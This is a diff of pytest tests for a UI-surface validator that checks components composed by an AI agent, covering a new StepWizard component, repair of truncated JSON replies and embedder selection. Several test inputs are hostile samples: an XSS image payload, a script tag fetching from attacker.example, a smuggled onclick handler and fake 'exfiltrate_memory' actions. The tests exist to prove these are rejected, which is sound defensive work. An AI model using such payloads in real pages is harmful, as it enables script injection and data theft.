@@ -9,6 +9,7 @@ TestClient. No live gateway, no Ollama, no network.
 from __future__ import annotations
 
 import copy
+import json
 import re
 import sys
 from pathlib import Path
@@ -19,6 +20,7 @@ from fastapi.testclient import TestClient
 
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
+from s13code.runtime import _parse_json_object, _select_embedder, _work_intent
 from s13code.ui.agui import (
     empty_state,
     replay_state,
@@ -390,8 +392,8 @@ def test_manifest_surfaces_every_registered_action():
 
 
 def test_catalog_is_the_realigned_a2ui_basic_plus_custom_set():
-    """23 types: 15 A2UI-Basic + 8 custom, each tagged with its source."""
-    assert len(COMPONENTS) == 23
+    """24 types: 15 A2UI-Basic + 9 custom, each tagged with its source."""
+    assert len(COMPONENTS) == 24
     by_source: dict[str, set[str]] = {}
     for name, spec in COMPONENTS.items():
         assert spec.source in ("a2ui-basic", "custom"), name
@@ -402,7 +404,7 @@ def test_catalog_is_the_realigned_a2ui_basic_plus_custom_set():
     }
     assert by_source["custom"] == {
         "BarChart", "Sparkline", "StatTile", "ProgressBar", "Timeline", "DataTable",
-        "Notice", "ApprovalCard",
+        "Notice", "ApprovalCard", "StepWizard",
     }
     # The removed types are truly gone.
     for gone in ("Heading", "Grid", "Table", "Tab", "Badge", "LineChart"):
@@ -608,3 +610,267 @@ def test_render_client_reconnects_and_rebuilds_from_a_state_snapshot():
     assert "rebuiltFromSnapshot" in html
     # The reducer still only ever touches text nodes (contract preserved above).
     assert "createTextNode" in html
+
+
+# --------------------------------------------------------------------------- #
+# StepWizard — the contributed component, held to the same three invariants
+# --------------------------------------------------------------------------- #
+
+def _wizard(**overrides) -> dict:
+    comp = {
+        "id": "wiz", "type": "StepWizard", "title": "Study plan",
+        "steps": {"$bind": "/steps"}, "active": {"$bind": "/active_step"},
+        "advance": {"action": "request_data"},
+    }
+    comp.update(overrides)
+    return comp
+
+
+def test_stepwizard_is_in_the_catalog_as_a_source_tagged_custom_extension():
+    spec = COMPONENTS["StepWizard"]
+    assert spec.source == "custom"
+    assert {p: s.kind for p, s in spec.props.items()} == {
+        "title": "text", "steps": "binding", "active": "binding", "advance": "action",
+    }
+
+
+def test_stepwizard_composed_against_a_real_data_model_validates_clean():
+    surface = {
+        "root": "root",
+        "components": [{"id": "root", "type": "Column", "children": ["wiz"]}, _wizard()],
+        "dataModel": {
+            "steps": [{"label": "Limits", "detail": "one-sided limits"},
+                      {"label": "Derivatives", "detail": "product rule"}],
+            "active_step": 0,
+        },
+    }
+    result = validate_surface(surface)
+    assert result.ok, [r.as_dict() for r in result.rejections]
+    assert {c["id"] for c in result.accepted} == {"root", "wiz"}
+
+
+def test_stepwizard_catalog_invariant_rejects_a_lookalike_type():
+    """A hostile agent cannot reach the new renderer under a name near it."""
+    assert _reject({"id": "x", "type": "StepWizardRaw"}).invariant == Invariant.CATALOG
+    assert _reject({"id": "x", "type": "Wizard"}).invariant == Invariant.CATALOG
+
+
+def test_stepwizard_data_not_code_refuses_markup_in_a_bound_prop():
+    r = _reject(_wizard(title="<img src=x onerror=alert(1)>"))
+    assert r.invariant == Invariant.DATA_NOT_CODE
+    assert r.field == "title"
+
+
+def test_stepwizard_data_not_code_refuses_inline_text_where_a_binding_belongs():
+    """`steps` must be {"$bind": "/pointer"} — inline content is how markup sneaks in."""
+    r = _reject(_wizard(steps="<script>fetch('https://attacker.example')</script>"))
+    assert r.invariant == Invariant.DATA_NOT_CODE
+    assert r.field == "steps"
+
+
+def test_stepwizard_data_not_code_refuses_a_smuggled_handler_property():
+    r = _reject(_wizard(onclick="steal()"))
+    assert r.invariant == Invariant.DATA_NOT_CODE
+    assert "event-handler property is never allowed" in r.reason
+
+
+def test_stepwizard_data_not_code_refuses_an_unknown_property():
+    r = _reject(_wizard(html="<b>hi</b>"))
+    assert r.invariant == Invariant.DATA_NOT_CODE
+
+
+def test_stepwizard_event_invariant_refuses_an_unregistered_advance_action():
+    r = _reject(_wizard(advance={"action": "exfiltrate_memory"}))
+    assert r.invariant == Invariant.EVENT
+    assert "exfiltrate_memory" in r.reason
+
+
+def test_stepwizard_only_advances_through_a_registered_action():
+    for name in sorted(REGISTERED_ACTIONS):
+        result = validate_surface({"root": "wiz", "components": [_wizard(advance={"action": name})]})
+        assert result.ok, name
+
+
+def test_a_poisoned_stepwizard_is_dropped_while_the_safe_surface_still_renders():
+    surface = {
+        "root": "root",
+        "components": [
+            {"id": "root", "type": "Column", "children": ["ok", "evil"]},
+            {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
+            _wizard(id="evil", advance={"action": "drop_all_memory"}),
+        ],
+        "dataModel": {"title": "Study plan"},
+    }
+    result = validate_surface(surface)
+    assert not result.ok
+    assert [c["id"] for c in result.accepted] == ["root", "ok"]
+    assert all(c["type"] != "StepWizard" for c in result.accepted)
+
+
+@pytest.mark.parametrize("client_file", ["index.html", "app.html"])
+def test_both_render_clients_draw_stepwizard_without_executing_anything(client_file):
+    html = (_BUILD_ROOT / "s13code" / "ui" / "client" / client_file).read_text()
+    assert "StepWizard" in html
+    # No bound value — indeed no value at all — is ever assigned as markup, and
+    # the client never hands a string to an evaluator.
+    assert not re.search(r"innerHTML\s*=", html)
+    assert not re.search(r"\beval\s*\(", html)
+    assert not re.search(r"\bnew\s+Function\s*\(", html)
+    assert not re.search(r"\b(setTimeout|setInterval)\s*\(\s*[\"']", html)
+    assert not re.search(r"\bouterHTML\s*=|insertAdjacentHTML|document\.write", html)
+
+
+def test_compose_prompt_never_names_stepwizard_so_the_model_must_choose_it():
+    """The agent may only learn StepWizard exists by reading the catalog it is
+    handed. If the prompt named the component, 'composed unprompted' would be a
+    lie — so assert the engine's own source never mentions it."""
+    runtime_src = (_BUILD_ROOT / "s13code" / "runtime.py").read_text()
+    assert "StepWizard" not in runtime_src
+    # But the catalog the compose step ships to the model does offer it.
+    assert "StepWizard" in catalog_manifest()["components"]
+
+
+def test_app_viewer_status_line_is_dom_not_markup():
+    """Regression: the app shell used to set innerHTML with the user's own goal
+    interpolated into it, so a prompt containing markup executed in the shell
+    around a perfectly clean interface. The status line is DOM now."""
+    for name in ("app.html", "coach.html"):
+        html = (_BUILD_ROOT / "s13code" / "ui" / "client" / name).read_text()
+        assert "innerHTML=" not in html.replace(" ", ""), name
+        assert "function setStatus(tone, label, detail)" in html, name
+
+
+# --------------------------------------------------------------------------- #
+# children are references — an inline component object never reaches the client
+# --------------------------------------------------------------------------- #
+
+def test_inline_child_component_object_breaks_data_not_code():
+    """A nested component object in `children` would ride into the client
+    without ever having been checked against the catalog. It is refused."""
+    surface = {"root": "root", "components": [
+        {"id": "root", "type": "Column",
+         "children": [{"id": "evil", "type": "RawHtml", "html": "<script>x()</script>"}]},
+    ]}
+    result = validate_surface(surface)
+    assert not result.ok
+    r = result.rejections[0]
+    assert r.invariant == Invariant.DATA_NOT_CODE
+    assert r.field == "children"
+
+
+def test_non_string_children_are_refused_and_do_not_crash_the_composer():
+    for bad in ([{"a": 1}], [3], "root", {"0": "a"}, [None], [["x"]]):
+        result = validate_surface({"root": "r", "components": [
+            {"id": "r", "type": "Column", "children": bad}]})
+        assert not result.ok, bad
+
+
+def test_children_on_a_component_that_takes_none_are_refused():
+    result = validate_surface({"root": "r", "components": [
+        {"id": "r", "type": "Notice", "text": {"$bind": "/t"}, "children": ["x"]}]})
+    assert not result.ok
+    assert result.rejections[0].field == "children"
+
+
+def test_legitimate_id_children_still_validate():
+    result = validate_surface({"root": "root", "components": [
+        {"id": "root", "type": "Column", "children": ["a", "b-1", "c_2"]},
+        {"id": "a", "type": "Divider"}, {"id": "b-1", "type": "Divider"},
+        {"id": "c_2", "type": "Divider"},
+    ]})
+    assert result.ok, [r.as_dict() for r in result.rejections]
+
+
+# --------------------------------------------------------------------------- #
+# a truncated model reply still yields an interface
+# --------------------------------------------------------------------------- #
+
+def test_a_truncated_surface_reply_is_repaired_into_the_finished_components():
+    """Regression from a real Gemini run: the reply stopped mid-component, so the
+    whole interface was lost and a UI-only turn rendered nothing. The finished
+    components are recovered instead."""
+    truncated = (
+        '```json\n{\n "root": "col",\n "components": [\n'
+        '  {"id": "col", "type": "Column", "children": ["h", "t"]},\n'
+        '  {"id": "h", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},\n'
+        '  {"id": "t", "type": "Text",\n'
+    )
+    parsed = _parse_json_object(truncated)
+    assert isinstance(parsed, dict)
+    assert parsed["root"] == "col"
+    assert [c["id"] for c in parsed["components"]] == ["col", "h"]
+    assert validate_surface(parsed).ok
+
+
+def test_repair_never_invents_a_component_or_leaves_a_half_written_string():
+    # Cut inside a string value: that component is dropped, not guessed at.
+    parsed = _parse_json_object('{"root": "c", "components": [{"id": "c", "type": "Col')
+    assert parsed is None or parsed.get("components") == []
+    # A well-formed reply is untouched.
+    good = {"root": "c", "components": [{"id": "c", "type": "Divider"}]}
+    assert _parse_json_object(json.dumps(good)) == good
+
+
+def test_a_repaired_tree_drops_child_refs_that_never_arrived():
+    """Truncation leaves children pointing at components that do not exist. The
+    surface still has to render, so those refs are dropped rather than left as
+    holes the client would silently skip."""
+    parsed = _parse_json_object(
+        '{"root": "col", "components": [\n'
+        '  {"id": "col", "type": "Column", "children": ["a", "gone"]},\n'
+        '  {"id": "a", "type": "Divider"},\n'
+        '  {"id": "gone", "type": '
+    )
+    accepted = validate_surface(parsed).accepted
+    ids = {c["id"] for c in accepted}
+    assert ids == {"col", "a"}
+    dangling = [child for c in accepted for child in c.get("children", []) if child not in ids]
+    assert dangling == ["gone"], "the composer is what drops these; validator keeps them visible"
+
+
+# --------------------------------------------------------------------------- #
+# an app turn is one goal, not a fan-out of research
+# --------------------------------------------------------------------------- #
+
+def test_a_tapped_label_full_of_commas_is_one_goal_not_a_research_fanout():
+    """Regression from a real StudyCoach run: a tapped chip reading
+    'Algebra (Complex Numbers, Quadratic Equations, ...)' was read as a list of
+    entities, so ONE conversational turn fanned into six model calls, burned the
+    provider's per-minute quota, and returned no interface at all. An explicit
+    respond_as='ui' turn always takes the single-goal path."""
+    tapped = ("Coach me for the JEE Advanced maths paper.\nThe learner then chose: "
+              "Algebra (Complex Numbers, Quadratic Equations, Progressions, Binomial Theorem).")
+    mode, frontier = _work_intent(tapped, "ui")
+    assert mode == "compose_answer"
+    assert [task.id for task in frontier] == ["content"]
+
+
+def test_a_phrased_multi_entity_ui_request_still_fans_out():
+    """The entity fan-out is not removed — it is scoped to phrased requests, where
+    the commas are the author's own list."""
+    mode, frontier = _work_intent(
+        "Compose a dashboard comparing the populations of London, Berlin and Paris.", "text")
+    assert mode == "compose_research"
+    assert len(frontier) >= 2
+
+
+# --------------------------------------------------------------------------- #
+# the embedder a cloud container can actually reach
+# --------------------------------------------------------------------------- #
+
+def test_embedder_defaults_to_ollama_but_is_selectable_for_a_cloud_deploy(monkeypatch):
+    """A serverless container has no Ollama sidecar, and an unreachable embedder
+    fails every memory write. The local default is unchanged; the deploy opts out."""
+    monkeypatch.delenv("S13_EMBEDDER", raising=False)
+    assert _select_embedder().fingerprint.startswith("ollama:")
+    monkeypatch.setenv("S13_EMBEDDER", "deterministic")
+    assert _select_embedder().fingerprint.startswith("deterministic:")
+
+
+def test_the_two_embedders_have_different_fingerprints(monkeypatch):
+    """The store treats a changed fingerprint as stale rather than unsearchable,
+    so switching must be visible to it."""
+    monkeypatch.delenv("S13_EMBEDDER", raising=False)
+    local = _select_embedder().fingerprint
+    monkeypatch.setenv("S13_EMBEDDER", "deterministic")
+    assert _select_embedder().fingerprint != local
